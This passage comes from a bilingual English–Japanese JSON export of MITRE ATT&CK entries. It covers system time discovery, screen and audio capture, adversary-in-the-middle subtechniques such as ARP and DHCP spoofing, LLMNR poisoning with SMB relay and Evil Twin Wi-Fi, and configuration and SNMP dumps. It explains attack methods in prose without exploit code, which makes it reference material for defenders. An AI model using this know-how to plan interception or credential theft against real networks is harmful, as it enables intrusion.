                "description_eng": "An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd) On ESXi servers, `esxcli system clock get` can be used for the same purpose.\n\nIn addition, system calls – such as <code>time()</code> – have been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)",
                "description_jp": "攻撃者は、ローカルまたはリモートシステムからシステム時刻および/またはタイムゾーン設定を収集する可能性があります。システム時刻は、WindowsのWindows Time ServiceやmacOSの<code>systemsetup</code>などのサービスによって設定および保存されます。(引用: MSDN System Time)(引用: Technet Windows Time Service)(引用: systemsetup mac time) これらの時刻設定は、エンタープライズネットワーク内のシステムとサービス間で同期される場合もあり、通常はドメイン内のネットワークタイムサーバーで実行されます。(引用: Mac Time Sync)(引用: linux system time)\n\nシステム時刻情報は、Windowsで<code>net time \\\\hostname</code>を実行してリモートシステムのシステム時刻を収集するなど、さまざまな方法で収集できます。被害者のタイムゾーンは、現在のシステム時刻から推測したり、<code>w32tm /tz</code>を使用して収集したりすることもできます。(引用: Technet Windows Time Service) さらに、攻撃者は<code>GetTickCount()</code>などの関数を使用してデバイスの稼働時間を検出し、システムの起動からの経過時間を確認できます。(引用: Virtualization/Sandbox Evasion)\n\nネットワークデバイスでは、<code>show clock detail</code>などの[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドを使用して、現在の時刻設定を確認できます。(引用: show_clock_detail_cisco_cmd) ESXiサーバーでは、同じ目的で<code>esxcli system clock get</code>を使用できます。\n\nさらに、<code>time()</code>などのシステムコールが、Linuxデバイスで現在の時刻を収集するために使用されています。(引用: MAGNET GOBLIN) macOSシステムでは、攻撃者は<code>systemsetup -gettimezone</code>や<code>timeIntervalSinceNow</code>などのコマンドを使用して、現在のタイムゾーン情報や現在の日時を収集する可能性があります。(引用: System Information Discovery Technique)(引用: ESET DazzleSpy Jan 2022)\n\nこの情報は、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)でファイルを実行したり(引用: RSA EU12 They're Inside)、タイムゾーンに基づいて地域情報を発見して被害者のターゲティングを支援したり(つまり[システムロケーションディスカバリ](https://attack.mitre.org/techniques/T1614))するなど、他のテクニックを実行するのに役立つ可能性があります。攻撃者はまた、タイムボムの一部として、または指定された日時まで実行を遅らせるために、システム時刻の知識を使用する可能性があります。(引用: AnyRun TimeBomb)",
                "subtechniques": []
            }
        ]
    },
    {
        "id": "TA0009",
        "name_eng": "Collection",
        "name_jp": "収集",
        "description_eng": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
        "description_jp": "攻撃者は、目標に関心のあるデータを収集しようとしています。\n\n収集は、攻撃者が情報を収集するために使用する可能性のあるテクニックと、攻撃者の目的を達成する上で関連する情報源で構成されます。多くの場合、データ収集後の次の目標は、データを盗む（持ち出す）か、ターゲット環境に関するより多くの情報を得るためにデータを使用することです。一般的なターゲットソースには、さまざまなドライブタイプ、ブラウザ、オーディオ、ビデオ、電子メールが含まれます。一般的な収集方法には、スクリーンショットのキャプチャやキーボード入力が含まれます。",
        "techniques": [
            {
                "id": "T1113",
                "name_eng": "Screen Capture",
                "name_jp": "スクリーンキャプチャ",
                "description_eng": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)",
                "description_jp": "攻撃者は、作戦の過程で情報を収集するためにデスクトップのスクリーンキャプチャを取得しようとする可能性があります。スクリーンキャプチャ機能は、侵害後の操作で使用されるリモートアクセスツールの機能として含まれている場合があります。スクリーンショットの取得は、通常、<code>CopyFromScreen</code>、<code>xwd</code>、<code>screencapture</code>などのネイティブユーティリティまたはAPI呼び出しを介しても可能です。(引用: CopyFromScreen .NET)(引用: Antiquated Mac Malware)",
                "subtechniques": []
            },
            {
                "id": "T1557",
                "name_eng": "Adversary-in-the-Middle",
                "name_jp": "中間者攻撃",
                "description_eng": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "description_jp": "攻撃者は、[ネットワーク・スニッフィング](https://attack.mitre.org/techniques/T1040)、[送信データ操作](https://attack.mitre.org/techniques/T1565/002)、またはリプレイ攻撃([クレデンシャル・アクセスのための搾取](https://attack.mitre.org/techniques/T1212))などの後続動作をサポートするために、敵対者の中間(AiTM)技術を使用して 2 つ以上のネットワーク接続されたデバイスの間に自分自身を位置付けようとするかもしれない。ネットワーク・トラフィックのフローを決定できる一般的なネットワーキング・プロトコルの機能(ARP、DNS、LLMNR など)を悪用することで、敵対者はデバイスに敵対者が制御するシステムを介して通信するよう強制し、情報収集や追加のアクションを実行することができる(引用：Rapid7 MiTM Basics)。\n\n例えば、敵対者は被害者の DNS 設定を操作して、ユーザが合法的なサイトにアクセスするのを阻止/リダイレクトしたり、追加のマルウェアをプッシュしたりするなどの他の悪意ある活動を可能にするかもしれません(引用：ttint_rat)(引用：dns_changer_trojans)(引用：ad_blocker_with_miner) また、敵対者は DNS を操作し、その立場を利用して、アクセストークンを含むユーザの認証情報を傍受する可能性もあります([アプリケーションアクセストークンの窃取](https://attack.mitre.org/techniques/T1528))やセッションクッキー([Webセッションクッキーの窃取](https://attack.mitre.org/techniques/T1539)) を含む。(引用：volexity_0day_sophos_FW)(引用：トークン戦術) [ダウングレード攻撃](https://attack.mitre.org/techniques/T1562/010)通信プロトコル(SSL/TLS)や暗号化アルゴリズムの、より安全性の低い、非推奨の、またはより弱いバージョンを交渉することなどによって、AiTMの立場を確立するために使用することもできる(引用：mitm_tls_downgrade_att)(引用：taxonomy_downgrade_att_tls)(引用：tlseminar_downgrade_att)\n\n攻撃者はまた、AiTM の立場を利用して、[送信データ操作](https://attack.mitre.org/techniques/T1565/002)のように、トラフィックの監視や変更を試みることもできる。攻撃者は AiTM と同じようなポジションをセットアップして、トラフィックが適切な宛先に流れ ないようにすることができる。これは潜在的には[防御の阻害](https://attack.mitre.org/techniques/T1562)、[ネットワークサービス拒否](https://attack.mitre.org/techniques/T1498)をサポートするためである。",
                "subtechniques": [
                    {
                        "id": "T1557.003",
                        "name_eng": "DHCP Spoofing",
                        "name_jp": "DHCPスプーフィング",
                        "description_eng": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool.",
                        "description_jp": "攻撃者は、DHCP（Dynamic Host Configuration Protocol）トラフィックを偽装し、被害者ネットワーク上で悪意のあるDHCPサーバとして振る舞うことで、ネットワークトラフィックを攻撃者が所有するシステムにリダイレクトする可能性があります。攻撃者は、中間者（AiTM）の立場を獲得することで、特に安全でない暗号化されていないプロトコルで送信された、渡された認証情報を含むネットワーク通信を収集することができます。これにより、[ネットワーク・スニッフィング](https://attack.mitre.org/techniques/T1040) や [送信データ操作](https://attack.mitre.org/techniques/T1565/002) のような後続の動作も可能になるかもしれません。\n\nDHCPはクライアント・サーバ・モデルに基づいており、DHCPサーバからク ライアントにネットワーク・コンフィグレーション設定を提供するプロトコルと、 クライアントにネットワーク・アドレスを割り当てるメカニズムという2つの機能を持ってい ます：\n\n1.クライアントは「DISCOVER」メッセージをブロードキャストする。\n\n2.サーバーは利用可能なネットワークアドレスを含む `OFFER` メッセージで応答する。\n\n3.クライアントは`REQUEST`メッセージをブロードキャストする。\n\n4.サーバは`ACK`メッセージで確認し、クライアントはネットワーク設定パラメータを受信する。\n\n攻撃者は被害者ネットワーク上で不正なDHCPサーバになりすまし、そこから正当なホストが悪意のあるネットワーク設定を受け取るかもしれません。例えば、マルウェアは DHCP サーバとして動作し、敵が所有する DNS サーバを被害コンピュータに提供することができる。(引用：new_rogue_DHCP_serv_malware)(引用：w32.tidserv.g) 悪意のあるネットワーク・コンフィギュレーションを通して、敵は AiTM の位置を獲得し、クライアントのトラフィックを敵が制御するシステムにルーティングし、クライアント・ネットワークから情報を収集することができる。\n\nDHCPv6クライアントは、<code>All_DHCP_Relay_Agents_and_Servers</code>マルチキャストアドレスに<code>INFORMATION-REQUEST(code 11)</code>メッセージを送信することで、IPアドレスを割り当てられることなくネットワーク設定情報を受け取ることができます(引用：rfc3315)。攻撃者は、このリクエストメッセージに対して悪意のあるネットワーク設定で応答するために、不正なDHCPサーバーを使用する可能性があります。\n\nAiTM の位置を確立するのではなく、攻撃者は DHCP スプーフィングを悪用して、多数のブロードキャスト DISCOVER メッセージを生成し、ネットワークの DHCP 割り当てプールを使い果たす DHCP 枯渇攻撃（つまり、[サービス枯渇フラッド](https://attack.mitre.org/techniques/T1499/002)）を実行することもあります。"
                    },
                    {
                        "id": "T1557.002",
                        "name_eng": "ARP Cache Poisoning",
                        "name_jp": "ARPキャッシュポイズニング",
                        "description_eng": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)",
                        "description_jp": "攻撃者はアドレス解決プロトコル(ARP)キャッシュを汚染し、2つ以上のネットワークデバイスの通信の間に位置する。この活動は、[ネットワーク・スニッフィング](https://attack.mitre.org/techniques/T1040)や[送信データ操作](https://attack.mitre.org/techniques/T1565/002)などの後続の行動を可能にするために使用されるかもしれない。\n\nARPプロトコルは、IPv4アドレスをメディアアクセス制御（MAC）アドレスなどのリンク層アドレスに解決するために使用される（引用：RFC826 ARP）。ローカルネットワークセグメント内のデバイスは、リンク層アドレスを使用して相互に通信します。ネットワークデバイスが特定のネットワークデバイスのリンクレイヤーアドレスを持たない場合、IPアドレスをMACアドレスに変換するために、ローカルネットワークにブロードキャストARPリクエストを送信することがあります。関連するIPアドレスを持つデバイスは、直接そのMACアドレスを返信します。ARPリクエストを行ったネットワークデバイスは、その情報をARPキャッシュに保存するだけでなく、使用します。\n\n敵対者はARPリクエストを受動的に待ち、リクエストしたデバイスのARPキャッシュを汚染するかもしれない。敵対者は自分のMACアドレスで返信し、被害者に意図したネットワークデバイスと通信していると思わせて欺くかもしれない。敵対者がARPキャッシュをポイズニングするには、その返信が正当なIPアドレスの所有者が行うものより速くなければならない。敵はまた、特定のIPアドレスの所有者をローカルネットワークセグメント内のすべてのデバイスに悪意を持って公表する、無償のARPリプライを送信する可能性があります。\n\nARPプロトコルはステートレスであり、認証を必要としない。そのため、デバイスは、ARPキャッシュ内のIPアドレスのMACアドレスを誤って追加または更新する可能性がある(引用：Sans ARP Spoofing Aug 2003)(引用：Cylance Cleaver)\n\n攻撃者は、ネットワークトラフィックを傍受する手段としてARPキャッシュポイズニングを使用する可能性があります。この行為は、特に安全でない暗号化されていないプロトコルで送信された認証情報などのデータを収集したり、中継したりするために使用される可能性がある(引用：Sans ARP Spoofing Aug 2003)"
                    },
                    {
                        "id": "T1557.001",
                        "name_eng": "LLMNR/NBT-NS Poisoning and SMB Relay",
                        "name_jp": "LLMNR/NBT-NSポイズニングとSMBリレー",
                        "description_eng": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",
                        "description_jp": "LLMNR/NBT-NSネットワークトラフィックに応答することで、敵対者は名前解決のための権威ソースを偽装し、敵対者が制御するシステムとの通信を強制することができる。この活動は、認証材料を収集または中継するために使用される可能性がある。\n\nLink-Local Multicast Name Resolution (LLMNR) および NetBIOS Name Service (NBT-NS) は、ホスト識別の代替方法として機能する Microsoft Windows コンポーネントです。LLMNRはドメインネームシステム（DNS）形式に基づいており、同じローカルリンク上のホストが他のホストの名前解決を実行できるようにする。NBT-NSは、NetBIOS名によってローカルネットワーク上のシステムを識別する。(引用：Wikipedia LLMNR)(引用：TechNet NetBIOS)\n\n攻撃者は、LLMNR (UDP 5355)/NBT-NS (UDP 137)トラフィックに対して、要求されたホストの身元を知っているかのように応答することで、被害者ネットワーク上の名前解決の権威ソースを偽装することができます。リクエストされたホストが識別/認証を必要とするリソースに属している場合、ユーザ名と NTLMv2 ハッシュが敵対者の制御下にあるシステムに送信される。そして敵対者は、ポートのトラフィックを監視するツールや[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)を用いて有線で送信されたハッシュ情報を収集し、[ブルートフォース](https://attack.mitre.org/techniques/T1110)を用いてオフラインでハッシュをクラックし、平文のパスワードを入手することができる。\n\n敵対者がシステム間の認証経路にあるシステムにアクセスできる場合や、認証情報を使用する自動スキャンが敵対者の制御下にあるシステムに対して認証を行おうとする場合、NTLMv1/v2 ハッシュを傍受し、ターゲットシステムに対してアクセスしコードを実行するために中継することができる。リレーのステップはポイズニングと連動して行われることもあるが、それとは無関係に行われることもある(引用: byt3bl33d3r NTLM Relaying)(引用: Secure Ideas SMB Relay) さらに、敵対者は NTLMv1/v2 ハッシュを LDAP、SMB、MSSQL、HTTP などの様々なプロトコルにカプセル化し、有効な NTLM レスポンスを用いて複数のサービスを拡張し、利用することができる。\n\nNBNSpoof や Metasploit、[Responder](https://attack.mitre.org/software/S0174) など、ローカルネットワーク内のネームサービスを汚染するためにいくつかのツールが使用されている。(引用: GitHub NBNSpoof)(引用: Rapid7 LLMNR Spoofer)(引用: GitHub Responder)"
                    },
                    {
                        "id": "T1557.004",
                        "name_eng": "Evil Twin",
                        "name_jp": "邪悪な双子",
                        "description_eng": "Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or [Input Capture](https://attack.mitre.org/techniques/T1056).(Citation: Australia ‘Evil Twin’)\n\nBy using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks.(Citation: Kaspersky evil twin)(Citation: medium evil twin)  Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks.(Citation: specter ops evil twin)  A Wi-Fi Pineapple – a network security auditing and penetration testing tool – may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic. \n\nSimilarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network.(Citation: specter ops evil twin)  Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network.\n\nUpon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim’s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points.",
                        "description_jp": "攻撃者は、[ネットワーク・スニッフィング](https://attack.mitre.org/techniques/T1040)、[送信データ操作](https://attack.mitre.org/techniques/T1565/002)、[入力キャプチャ](https://attack.mitre.org/techniques/T1056)などの後続行為をサポートする方法として、一見本物のWi-Fiアクセスポイントをホストしてユーザーを欺き、悪意のあるネットワークに接続させることがあります。(引用：オーストラリア「イービル・ツイン」)\n\n正規のWi-Fiネットワークのサービスセット識別子(SSID)を使用することで、不正なWi-Fiアクセスポイントはデバイスやユーザーを騙し、悪意のあるWi-Fiネットワークに接続させる可能性があります(引用：Kaspersky evil twin)(引用：medium evil twin) 敵対者は、被害者のデバイスを悪意のあるネットワークに接続するよう強要または誘惑するために、より強い信号強度を提供したり、Wi-Fiアクセスポイントへのアクセスをブロックしたりする可能性があります。(引用：specter ops evil twin） ネットワーク・セキュリティ監査および侵入テスト・ツールであるWi-Fi Pineappleは、使いやすさと範囲の広さを目的として、Evil Twin攻撃に導入されることがあります。HTTPS トラフィックを傍受するために、カスタム証明書が使用されることもある。\n\n同様に、敵対者は既知の、あるいは以前に接続されたネットワーク（Preferred Network Lists：PNL）に対するプローブ要求を送信するクライアント・デバイスをリッスンすることもあります。悪意のあるアクセス・ポイントがプローブ・リクエストを受信すると、敵対者は同じ SSID で応答し、信頼できる既知のネットワークを模倣することができます（引用：specter ops evil twin）。被害者デバイスは、応答したアクセス・ポイントが自分の PNL のものであると信じ込まされ、不正なネットワークへの接続を開始します。\n\n悪意のあるWi-Fiアクセス・ポイントにログインすると、ユーザーは偽のログイン・ページやキャプティブ・ポータル・ウェブページに誘導され、被害者の認証情報を取得します。ユーザーが不正なWi-Fiネットワークにログインすると、敵対者はネットワーク・アクティビティを監視したり、データを操作したり、追加の認証情報を盗んだりすることができます。空港、喫茶店、図書館など、公衆Wi-Fiアクセスが集中している場所は、敵対者が不正なWi-Fiアクセス・ポイントを設置するターゲットになる可能性があります。"
                    }
                ]
            },
            {
                "id": "T1602",
                "name_eng": "Data from Configuration Repository",
                "name_jp": "設定リポジトリからのデータ",
                "description_eng": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "description_jp": "攻撃者は、管理対象デバイスに関連するデータを構成リポジトリから収集する可能性があります。構成リポジトリは、リモートシステム上のデータを構成、管理、および制御するために管理システムによって使用されます。構成リポジトリはまた、デバイスへのリモートアクセスと管理を容易にする場合もあります。\n\n敵対者は、大量の機密システム管理データを収集するためにこれらのリポジトリを標的にする可能性があります。構成リポジトリからのデータは、さまざまなプロトコルやソフトウェアによって公開される可能性があり、敵対者のディスカバリー目標と一致する可能性のある多種多様なデータを保存できます。(引用: US-CERT-TA18-106A)(引用: US-CERT TA17-156A SNMP Abuse 2017)",
                "subtechniques": [
                    {
                        "id": "T1602.002",
                        "name_eng": "Network Device Configuration Dump",
                        "name_jp": "ネットワークデバイス設定ダンプ",
                        "description_eng": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.",
                        "description_jp": "攻撃者はネットワーク構成ファイルにアクセスして、デバイスとネットワークに関する機密データを収集する可能性があります。ネットワーク構成は、デバイスの動作を決定するパラメータを含むファイルです。デバイスは通常、動作中に構成のメモリ内コピーを保存し、デバイスリセット後にロードするために不揮発性ストレージに別の構成を保存します。攻撃者は構成ファイルを検査して、ターゲットネットワークとそのレイアウト、ネットワークデバイスとそのソフトウェアに関する情報を明らかにしたり、後で使用するために正当なアカウントと資格情報を特定したりできます。\n\n敵対者は、Simple Network Management Protocol (SNMP) や Smart Install (SMI) など、一般的な管理ツールやプロトコルを使用して、ネットワーク構成ファイルにアクセスすることができます。(引用: US-CERT TA18-106A Network Infrastructure Devices 2018)(引用: Cisco Blog Legacy Device Attacks) これらのツールは、構成リポジトリから特定のデータを照会したり、後で分析するために構成をエクスポートするようにデバイスを構成したりするために使用される場合があります。"
                    },
                    {
                        "id": "T1602.001",
                        "name_eng": "SNMP (MIB Dump)",
                        "name_jp": "SNMP (MIBダンプ)",
                        "description_eng": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)",
                        "description_jp": "攻撃者は、Simple Network Management Protocol（SNMP）を使用して管理されているネットワーク内の貴重な情報を収集および/またはマイニングするために、管理情報ベース（MIB）を標的にする可能性があります。\n\nMIBは、オブジェクト識別子（OID）の形式でSNMPを介してアクセス可能な変数情報を格納する構成リポジトリです。各OIDは、読み取りまたは設定できる変数を識別し、これらの変数のリモート変更を通じて構成変更などのアクティブな管理タスクを許可します。SNMPは、システム情報、ハードウェアの説明、物理的な場所、ソフトウェアパッケージなど、システムに関する優れた洞察を管理者に提供できます。(引用: SANS Information Security Reading Room Securing SNMP Securing SNMP) MIBには、実行中の構成、ルーティングテーブル、インターフェイスの詳細など、デバイスの運用情報も含まれる場合があります。\n\n攻撃者はSNMPクエリを使用して、SNMP管理デバイスから直接MIBコンテンツを収集し、ネットワークマップを構築し、将来の標的型エクスプロイトを容易にするネットワーク情報を収集する可能性があります。(引用: US-CERT-TA18-106A)(引用: Cisco Blog Legacy Device Attacks)"
                    }
                ]
            },
            {
                "id": "T1123",
                "name_eng": "Audio Capture",
                "name_jp": "音声キャプチャ",
                "description_eng": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "description_jp": "敵対者は、コンピュータの周辺機器（マイクやウェブカメラなど）やアプリケーション（音声通話やビデオ通話サービスなど）を利用して、機密性の高い会話を聞き取り、情報を収集する目的で音声録音をキャプチャすることがあります。(引用: ESET Attor Oct 2019)\n\nマルウェアやスクリプトは、オペレーティングシステムやアプリケーションが提供する利用可能なAPIを介してデバイスと対話し、音声をキャプチャするために使用される場合があります。音声ファイルはディスクに書き込まれ、後で持ち出される可能性があります。",
                "subtechniques": []
